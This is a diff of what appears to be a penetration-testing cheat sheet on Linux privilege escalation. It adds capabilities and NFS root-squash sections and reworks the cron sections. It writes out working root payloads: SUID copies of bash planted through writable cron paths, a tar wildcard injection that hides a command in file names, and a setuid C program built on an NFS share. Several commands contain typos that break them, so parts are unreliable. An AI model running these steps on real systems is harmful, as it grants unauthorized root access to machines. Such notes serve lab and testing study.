@@ -237,7 +237,7 @@
   7. Run the orignal binary that makes the call
   8. ROOT!
   
-### Binary Symlinks in nGinx with CVE-2016-1247
+### Binary Symlinks in nginx with CVE-2016-1247
   1. Check the version of nginx of 1.6.2 or earlier
   ```bash
   dpkg -l | grep nginx
@@ -286,44 +286,40 @@
   function <path to binary>() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
   export -f <path to binary>
   ```
-## Escalation via Scheduled Tasks
-### Check writeable Files and Directories
-```bash
-find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
-```
-Pay particulalar attention to the following locations
-  * /etc/init.d
-  * /etc/cron*
-  * /etc/crontab
-  * /etc/cron.allow
-  * /etc/cron.d 
-  * /etc/cron.deny
-  * /etc/cron.daily
-  * /etc/cron.hourly
-  * /etc/cron.monthly
-  * /etc/cron.weekly
-  * /etc/sudoers
-  * /etc/exports
-  * /etc/anacrontab
-  * /var/spool/cron
-  * /var/spool/cron/crontabs/root
+  
+## Escalation via Capabilities
+### Capabilities
+  1. Check the capabilities
+  ```bash
+  getcap -r / 2>/dev/null
+  ```
+  2. Find binaries with cap_setuid+ep
+  3. Check GTFObins for Capabilities
+  4. Run the command found in GTFObins
+  ```bash
+  <path of binary> <command to root>
+  ```
+  5. ROOT!
 
-### Enumerate Scheduled Tasks By checking the scheduled tasks
-```bash
-crontab -l
-ls -lah /var/spool/cron
-ls -lah /etc/cron*
-cat /etc/at.allow
-cat /etc/at.deny
-systemctl list-timers --all
-```
+## Escalation via Scheduled Tasks
+### Check Schedule tasks
+  ```bash
+  cat /etc/crontab
+  crontab -l
+  ls -lah /var/spool/cron
+  ls -lah /etc/cron*
+  cat /etc/at.allow
+  cat /etc/at.deny
+  systemctl list-timers --all
+  ```
+    
 ### Escalation via Cron Paths
   1. Check the PATH= Variable.
   2. Check what files are being run.
   3. Check if the file exists in the file path from left to right.
       * If it does not exist, check if you can write the file
-
-
+    
+    
            i. Create The File With:
            
             echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > <path>/<file>
@@ -336,64 +332,44 @@ systemctl list-timers --all
       * If the file exists before you find a writeable location, try something else.
 
 ### Escalation via Wildcards
-If a command accepts wildcards as an argument and it is present in the crontab or cronjob do the following:
-1. Research the executable
-2. Create files where the name of the file if fed as part of the argument
-3. The executable will interpret the name of the file as part of the command
-4. Profit
+  If a command accepts wildcards as an argument and it is present in the crontab or cronjob do the following:
+  1. Research the executable
+  2. Create files where the name of the file if fed as part of the argument
+  3. The executable will interpret the name of the file as part of the command
+  4. Profit
 
-Tar is a good example of this with the payloads
-```bash
-echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > root.sh
-chmod +x root.sh
-```
-```bash
---checkpoint=1
---checkpoint-action=exec=sh root,sh
-```
-
-## Check OS version
-## Check Kernel Version
-
-## List current running processes
-Look for processes running as root. A misconfigured or vulnerable running as run can be an easy win.
-ps aux | grep root
-List current processes
-ps au
-
-## List the contents of the Home Directory
- 
- ls /home
- 
-## List the contents of a users home directory
- 
- ls -lah /home/<user>
-
-## Check and retrieve the content of the SSH Directory
-
-  These can be used to access other systems within the environment
-  ls -lah /home/<user>/.ssh
-  
-## Check the Bash HIstory
-  history
-  
-## List a users sudo privileges
-  sudo -l
-  
-## Check the content of /etc/passwd
-  cat /etc/passwd
-  
-## Check the Content of /etc/cron*
-  ls /etc/cron.*
-  cat /etc/cron*/<cronjob>
-  
-## kust File Systems and Additional Drives
-  lsblk
-  
-## Find Writeable Directories
-  find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
-
-## Find writeable files
-  find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
-  
-#
+  Tar is a good example of this with the payloads
+  ```bash
+  echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > root.sh
+  chmod +x root.sh
+  ```
+  ```bash
+  touch --checkpoint=1
+  touch --checkpoint-action=exec=sh\root.sh
+  ```
+  When a backup is done, the files are interpreted as tar arguments.
+    
+## NFS Root Squashing
+  1. Identify files systems and identify no_root_squash
+  ```bash
+  cat /etc/exports
+  ````
+  2. Identify the mountable file shares from the local machine
+  ```bash
+  showmount -e <ip>
+  ````
+  3. Create a folder for the file syste, and mountit
+  ```bash
+  mkdir /tmp/mount
+  mount -o rw,vers=2 <IP>:<mount> /tmp/mount
+  ```
+  4. Create a malicious exploit.c file and build it
+  ```bach
+  echo 'int main() { setgid(0); setuid(0); syste,("/bin/bash"); return 0; }' > /tmp/mount/exploit.c
+  gcc /tmp/mount/exploit.x -o /tmp/mount/exploit
+  chmod +s /tmp/mount/exploit
+  ```
+  5. Execute from the target machine
+  ```bash
+  ./exploit
+  ```
